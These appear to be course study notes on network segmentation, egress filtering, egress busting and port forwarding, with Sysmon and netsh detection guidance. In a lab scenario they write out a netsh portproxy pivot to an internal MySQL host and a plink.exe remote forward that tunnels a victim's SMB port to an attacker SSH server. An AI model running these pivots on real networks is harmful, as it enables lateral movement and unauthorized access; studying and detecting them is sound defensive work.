# 14.1. Network Segmentation

## What Is Network Segmentation?

Network segmentation means splitting a large network into smaller logical or physical network areas.

Simple meaning:

```text
Network segmentation = divide one big network into smaller controlled zones.
```

Examples of segments:

```text
User network
Server network
DMZ
Database network
Management network
Production network
Development network
Guest network
```

---

## Why Network Segmentation Matters

Without segmentation:

```text
One compromised host may reach many other systems easily.
```

With segmentation:

```text
A compromised host is limited to its own network zone unless rules allow more access.
```

Benefits:

```text
limits lateral movement
reduces attack surface
makes monitoring easier
improves traffic control
helps isolate incidents
improves performance by reducing unnecessary traffic
supports Zero Trust design
```

---

## Old Perimeter Thinking

Traditional network security often focused on:

```text
inside network = trusted
outside network = untrusted
```

Problem:

```text
If an attacker gets inside, they may move freely.
```

Modern security uses a Zero Trust idea:

```text
Do not automatically trust anything just because it is inside the network.
```

---

## Zero Trust Concept

Zero Trust means:

```text
Never trust automatically.
Always verify.
Limit access based on need.
Monitor continuously.
```

Network segmentation supports Zero Trust because each segment becomes a small controlled area.

Simple meaning:

```text
Even internal traffic should be controlled and monitored.
```

# 14.1.2. Segmentation Theory

## Subnet

A subnet is a smaller logical network inside a larger network.

Example:

```text
172.18.2.0/24
```

This subnet includes:

```text
172.18.2.1 - 172.18.2.254
```

Simple meaning:

```text
Subnet = smaller IP network.
```

---

## IP Address

An IPv4 address has four decimal parts.

Example:

```text
172.18.2.11
```

It identifies a host on a network.

An IP address contains:

```text
network part
host part
```

The subnet mask tells us which part is the network part and which part is the host part.

---

## Subnet Mask

A subnet mask defines the network portion of the IP address.

Example:

```text
255.255.0.0
```

or:

```text
/16
```

Another example:

```text
255.255.255.0
```

or:

```text
/24
```

Simple meaning:

```text
Subnet mask tells us which IP addresses belong to the same network.
```

---

## Example: Class B Default Mask

IP:

```text
172.18.2.11
```

Mask:

```text
255.255.0.0
```

Network ID:

```text
172.18.0.0
```

Meaning:

```text
172.18.x.x belongs to the same large network.
```

---

## Example: More Segmented /24 Mask

IP:

```text
172.18.2.11
```

Mask:

```text
255.255.255.0
```

Network ID:

```text
172.18.2.0
```

Meaning:

```text
Only 172.18.2.x belongs to this subnet.
```

---

## Why Subnetting Helps

Subnetting helps administrators split a large network into smaller networks.

Example:

```text
172.18.1.0/24
172.18.2.0/24
172.18.3.0/24
172.18.4.0/24
```

Each subnet can have separate rules.

Example:

```text
Users can access web servers.
Web servers can access database servers.
Users cannot directly access database servers.
```

# 14.2. Egress Busting

## What Is Egress Filtering?

Egress filtering controls outbound traffic leaving a network.

Simple meaning:

```text
Egress filtering = firewall rules for traffic going out.
```

Example:

```text
Allow outbound HTTP/HTTPS.
Block unknown outbound ports.
```

---

## Why Egress Filtering Matters

Most malware needs to call back to the attacker.

Example:

```text
compromised host → attacker server
```

If outbound traffic is restricted, malware may fail to connect back.

Egress filtering can block:

```text
reverse shells
command and control traffic
data exfiltration
unauthorized tunnels
malware callbacks
```

---

## Two Egress Filtering Models

### Allow All Except Denied

```text
Default allow.
Block only known bad traffic.
```

Easier to manage but weaker.

### Deny All Except Allowed

```text
Default deny.
Only allow approved outbound ports and destinations.
```

Harder to manage but more secure.

---

# iptables Default Policy

## Default DROP

Example iptables policy:

```text
:INPUT DROP
:FORWARD DROP
:OUTPUT DROP
```

Meaning:

```text
Drop all traffic by default unless an allow rule exists.
```

Simple meaning:

```text
Default deny firewall.
```

---

## Allowed Outbound Ports

Example allowed ports:

```text
21    FTP
22    SSH
25    SMTP
80    HTTP
443   HTTPS
8080  Alternate HTTP
```

Firewall rules allow only selected ports.

Simple meaning:

```text
Outbound traffic is restricted to common ports.
```

---

## Port Forwarding Rules in iptables

Example concept:

```text
Traffic to snort port 80 → internal web server 172.16.50.11 port 80
Traffic to snort port 21 → internal web server 172.16.50.11 port 21
```

This is done with NAT rules:

```text
DNAT = change destination address
SNAT = change source address
```

so basically we have:

```text
DNAT changes where the packet is going.

Example:
snort:80 → webhost:80

SNAT changes where the packet appears to come from.

Example:
client IP → snort internal IP

DNAT is used before routing.
SNAT is used after routing.

In the chapter:
DNAT sends traffic from snort ports 80 and 21 to 172.16.50.11.
SNAT makes return traffic go back through snort correctly.
```

# What Is Egress Busting?

Egress busting is a technique attackers use to discover which outbound ports are allowed through a firewall.

Simple meaning:

```text
Egress busting = brute-force outbound ports to find allowed egress paths.
```

Attack idea:

```text
Compromised host tries many outbound ports.
Attacker listens for connections.
The port that succeeds is allowed through the firewall.
```

---

## Egress Busting Attack Flow

```text
Attacker compromises internal web server
→ Attacker uploads backdoor
→ Attacker uploads egress buster binary/script
→ Attacker starts listener on attacker machine
→ Compromised host tries connecting out on many TCP ports
→ Successful connection shows allowed outbound port
→ IDS/firewall may alert on the scan
```

---

## Egress Listener Concept

The listener redirects incoming TCP traffic from many ports to one listening port.

The script uses iptables NAT redirection.

Concept:

```text
Traffic from victim to any TCP port
→ redirected to one local listener port
```

# 14.3. Port Forwarding and Tunneling

## What Is Port Forwarding?

Port forwarding maps traffic from one IP/port to another IP/port.

Simple meaning:

```text
Traffic arrives at port A.
System redirects it to port B somewhere else.
```

Example:

```text
External host connects to firewall port 80.
Firewall forwards traffic to internal web server port 80.
```

---

## What Is Tunneling?

Tunneling wraps one type of traffic inside another protocol.

Simple meaning:

```text
Tunneling = carry one protocol inside another protocol.
```

Example:

```text
SMB traffic carried through SSH
MySQL traffic accessed through a forwarded port
Internal traffic tunneled to attacker machine
```

Important concept:

```text
Tunneling uses encapsulation.
```

---

## Encapsulation

Encapsulation means putting one protocol inside another.

Example:

```text
SMB inside SSH
Database traffic inside SSH
Internal TCP traffic inside HTTP/HTTPS
```

Simple meaning:

```text
Encapsulation hides or carries traffic inside another allowed channel.
```

---

## Port Forwarding vs Tunneling

| Concept | Meaning |
|---|---|
| Port forwarding | Redirect one IP/port to another IP/port |
| Tunneling | Encapsulate traffic inside another protocol |
| SSH tunneling | Use SSH to carry traffic securely |

Simple difference:

```text
Port forwarding redirects traffic.
Tunneling wraps traffic inside another protocol.
```

---

# Types of Port Forwarding and Tunneling

## Local Port Forwarding

Local forwarding maps a local port to another host/port.

Simple meaning:

```text
Connect to local port
→ traffic goes to remote/internal service
```

Example use:

```text
External user accesses firewall port 21.
Traffic is redirected to internal database port 3306.
```

---

## Remote Port Forwarding

Remote forwarding exposes an internal service on a remote external host.

Simple meaning:

```text
Internal compromised host connects out to attacker.
Attacker gets a listening port that forwards back into the internal service.
```

Example:

```text
Victim SMB port 445
→ exposed on attacker localhost port 1234
```

---

## Dynamic Port Forwarding

Dynamic forwarding creates a flexible proxy.

Simple meaning:

```text
One tunnel can reach many internal hosts and ports.
```

Often implemented as:

```text
SOCKS proxy
```

Example:

```text
Attacker configures proxychains.
Traffic to many internal services goes through the tunnel.
```

---

# 14.3.2. Local Port Forwarding in Practice

## Scenario

Network:

```text
attacker01 → snort firewall/router → webhost → dbhost
```

Hosts:

```text
webhost = 172.16.50.11
dbhost  = 172.16.50.12
```

Service:

```text
dbhost runs MySQL on port 3306
```

Problem for attacker:

```text
dbhost is not directly reachable from outside.
```

Attacker solution:

```text
Compromise webhost.
Create local port forwarding on webhost.
Redirect port 21 to dbhost port 3306.
```

---

## Windows Tool: `netsh`

`netsh` is a Windows network configuration tool.

Attackers can abuse it to create port forwarding rules.

Important interface:

```text
interface portproxy
```

Simple meaning:

```text
netsh interface portproxy redirects traffic from one address/port to another.
```

---

## Local Port Forwarding Command

```cmd
netsh interface portproxy add v4tov4 listenport=21 listenaddress=172.16.50.11 connectport=3306 connectaddress=172.16.50.12
```

Meaning:

```text
Listen on webhost 172.16.50.11 port 21.
Forward that traffic to dbhost 172.16.50.12 port 3306.
```

Simple summary:

```text
webhost:21 → dbhost:3306
```

---

## Firewall Rule for Forwarded Port

The attacker also adds a firewall rule:

```cmd
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=172.16.50.11 localport=21 action=allow
```

Meaning:

```text
Allow inbound TCP traffic to local port 21 on webhost.
```

Without this:

```text
The portproxy may exist, but local Windows Firewall may still block traffic.
```

---

## Local Port Forward Attack Flow

```text
Attacker compromises webhost
→ Finds database credentials in WordPress config
→ Database host is not directly reachable
→ Attacker stops FTP service on port 21
→ Attacker uses netsh portproxy
→ webhost port 21 forwards to dbhost port 3306
→ Attacker connects to snort external IP port 21
→ Traffic reaches MySQL on dbhost
```

---


# 14.3.2. Remote Port Forwarding in Practice

## Lab Scenario

The attacker wants to access SMB on the compromised webhost.

SMB normally runs on:

```text
TCP 445
```

Problem:

```text
SMB is not exposed through the firewall.
```

Attacker solution:

```text
Upload plink.exe.
Create SSH remote port forward.
Expose victim SMB locally on attacker port 1234.
```

---

## What Is plink.exe?

`plink.exe` is part of the PuTTY suite.

It is a command-line SSH, Telnet, and Rlogin client.

Simple meaning:

```text
plink.exe = command-line SSH client for Windows.
```

It is legitimate software, but attackers abuse it for tunneling.

---

## Why Attackers Use plink.exe

Windows may not have SSH installed by default.

So attackers upload:

```text
plink.exe
```

Then use it to create tunnels.

Common malicious use:

```text
remote port forwarding
local port forwarding
SOCKS proxying
encrypted tunnel to attacker host
```

---

## Remote Port Forwarding Command

Example:

```cmd
echo y | plink.exe -ssh -N -l kali -pw toor -R 192.168.48.2:1234:127.0.0.1:445 192.168.48.2
```

Breakdown:

```text
echo y
```

Automatically accepts the SSH host key prompt.

```text
plink.exe
```

Runs the PuTTY command-line SSH client.

```text
-ssh
```

Use SSH protocol.

```text
-N
```

Do not start a remote shell. Only forward ports.

```text
-l kali
```

SSH username is kali.

```text
-pw toor
```

SSH password is toor.

```text
-R 192.168.48.2:1234:127.0.0.1:445
```

Create a remote port forward.

```text
192.168.48.2:1234
```

Listen on attacker host port 1234.

```text
127.0.0.1:445
```

Forward traffic back to SMB on the compromised Windows host.

Final:

```text
192.168.48.2
```

Connect to attacker SSH server.

---

## Simple Remote Forward Meaning

```text
Attacker machine listens on 127.0.0.1:1234
→ SSH tunnel carries traffic to victim
→ victim forwards it to 127.0.0.1:445
→ attacker can access SMB through localhost:1234
```

Simple summary:

```text
attacker localhost:1234 → victim SMB port 445
```

---

# Detecting Remote Port Forwarding

## Sysmon Detection

Since plink.exe runs on the compromised Windows host, Sysmon can detect it.

Search for plink:

```powershell
Get-SysmonEvent | Where-Object { $_.Message -like "*plink*" }
```

Filter ProcessCreate:

```powershell
Get-SysmonEvent 1 "1/31/2022 11:46:12" "2/1/2022 12:02:39" |
Where-Object { $_.Message -like "*plink*" } |
Format-List
```

---


```cmd
netsh interface portproxy show v4tov4
```

Add portproxy rule:

```cmd
netsh interface portproxy add v4tov4 listenport=21 listenaddress=172.16.50.11 connectport=3306 connectaddress=172.16.50.12
```

Delete portproxy rule:

```cmd
netsh interface portproxy delete v4tov4 listenport=21 listenaddress=172.16.50.11
```

## Sysmon Detection

Search for plink:

```powershell
Get-SysmonEvent | Where-Object { $_.Message -like "*plink*" }
```

Search ProcessCreate events:

```powershell
Get-SysmonEvent 1 | Where-Object { $_.Message -like "*plink*" } | Format-List
```

Search for netsh:

```powershell
Get-SysmonEvent 1 | Where-Object { $_.Message -like "*netsh*" } | Format-List
```

Search for portproxy:

```powershell
Get-SysmonEvent 1 | Where-Object { $_.Message -like "*portproxy*" } | Format-List
```

# Key Detection Ideas

## Detect Egress Busting

Look for:

```text
many outbound connections
sequential destination ports
connections to one external attacker IP
traffic to disallowed outbound ports
Snort alerts with same message repeatedly
short time window
```

Example:

```text
172.16.50.11 → attacker port 491
172.16.50.11 → attacker port 492
172.16.50.11 → attacker port 493
```

---

## Detect Local Port Forwarding

Look for:

```text
netsh.exe execution
portproxy add v4tov4
new inbound firewall allow rule
unexpected forwarding from common port to internal service
port 21 redirected to 3306
Windows Firewall Event ID 2004
```

Important commands:

```cmd
netsh interface portproxy show v4tov4
Get-NetFirewallRule
Get-NetFirewallPortFilter
```

---

## Detect Remote Port Forwarding

Look for:

```text
plink.exe execution
plink.exe in upload/temp/web directories
SSH outbound from servers
command line with -R, -L, or -D
password in command line
local port listening on attacker machine
SMB accessed through non-standard local port
```

Important command-line pattern:

```text
plink.exe -ssh -N -R attacker:1234:127.0.0.1:445 attacker
```

# Quick Summary

```text
Network segmentation divides networks into smaller zones.

Segmentation can be implemented with:
subnets,
VLANs,
firewalls.

Egress filtering controls outbound traffic.

Egress busting is when an attacker brute-forces outbound ports to discover which ports are allowed.

Snort can detect egress busting by alerting on outbound traffic to disallowed ports.

Port forwarding redirects traffic from one IP/port to another IP/port.

Tunneling encapsulates one type of traffic inside another protocol.

Local port forwarding in the chapter:
webhost port 21 → dbhost MySQL port 3306
Tool used:
netsh interface portproxy

Remote port forwarding in the chapter:
attacker port 1234 → victim SMB port 445
Tool used:
plink.exe over SSH

Important detection points:
Snort alert_fast.txt
iptables rules
Windows Firewall event log
Get-NetFirewallRule
netsh interface portproxy show v4tov4
Sysmon ProcessCreate events
plink.exe command line
netsh.exe command line

Best defender mindset:
Do not only look at blocked traffic.
Look for configuration changes, new firewall rules, portproxy entries,
unusual SSH tunnels, and suspicious process command lines.
```
